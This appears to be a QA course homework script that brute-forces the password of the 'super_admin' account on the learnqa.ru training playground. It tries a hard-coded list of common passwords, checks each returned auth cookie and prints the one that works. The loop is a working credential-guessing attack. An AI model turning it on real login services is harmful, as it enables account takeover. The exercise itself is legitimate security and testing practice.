import requests
import urllib3
import time

# Ex9*: Подбор пароля

# http = urllib3.PoolManager()
# method = "POST"
url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
auth_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"
password = {'888888', 'iloveyou', 'freedom', 'ninja', '12345', '123qwe', 'starwars', 'zaq1zaq1', 'hello', 'loveme',
           'azerty', 'football', '7777777', 'admin', '1q2w3e4r', 'bailey', '654321', 'solo', '123456', 'ashley',
           'welcome', 'photoshop[a]', '1qaz2wsx', 'qwerty123', '111111', 'passw0rd', 'lovely', 'aa123456', 'hottie',
           'jesus', 'princess', 'michael', 'qwertyuiop', 'charlie', 'Football', 'abc123', '12345678', 'abc123 ',
           'dragon', 'password1', '696969', 'donald', 'access', 'letmein', 'superman', 'monkey', 'trustno1', '555555', 'shadow',
           'baseball', 'adobe123[a]', '1234', '000000', '1234567890', 'qazwsx', '!@#$%^&*', 'mustang', '121212',
           'password', 'master', 'qwerty', '666666', 'flower', 'sunshine', 'whatever', 'login', '1234567', 'batman', '123456789',
           '123123'}


for i in password:
    start_time = time.time()
    data = {"login": login, 'password': i}
    response_get = requests.get(url, params=data)
    # print(f"Please take your cooky = {dict(response_get.cookies)}")
    auth_cookie = dict(response_get.cookies)

    cookies = {}
    if cookies is not None:
        cookies.update(auth_cookie)
        response_post = requests.post(auth_url, cookies=cookies)

        if response_post.text == "You are authorized":
            print(f"{response_post.text}.\nWelcome user '{login}', your password '{i}', your cookies is = '{auth_cookie['auth_cookie']}'"
                  f"\nПотребовалось времени: {round(float('%s' % (time.time() - start_time)), 3)} секунд")
            break
    else:
        print(f"You are NOT authorized.\nSorry, your password '{i}', your cookies is = '{auth_cookie['auth_cookie']}' isn't True")
print("The END")

